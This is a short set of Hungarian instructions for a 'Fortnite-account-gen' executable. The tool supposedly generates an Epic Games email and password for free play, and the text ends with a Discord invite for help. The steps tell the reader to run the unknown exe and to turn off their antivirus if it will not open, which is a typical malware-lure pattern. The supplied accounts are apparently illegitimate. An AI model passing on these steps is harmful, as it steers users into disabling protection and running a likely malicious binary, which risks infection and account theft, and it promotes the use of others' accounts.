1. Mennyen be epic gamesbe és kejelntkezzen ki.

2. Nyissa meg a Fortnite-account-gen nevü exe filet. Majd tegye egyből talcára. Ha netán nem nyílik meg kapcsolja ki a vírus írtot. 

3. Válassza a 3 lehetőséget.

4. Miután megnyitotta az exe filet várjon 10mp. 

5. Az alkalmazás le fog generálni egy email címet valamint egy jelszót.

6. A meg adott adatokkal jelentkezzen be Epic Gamesbe. 

Élvezze a játékot. 

Ha bármiféle segítségre van szüksége keressen fel discord szerveren. https://discord.gg/mCfHsDBc


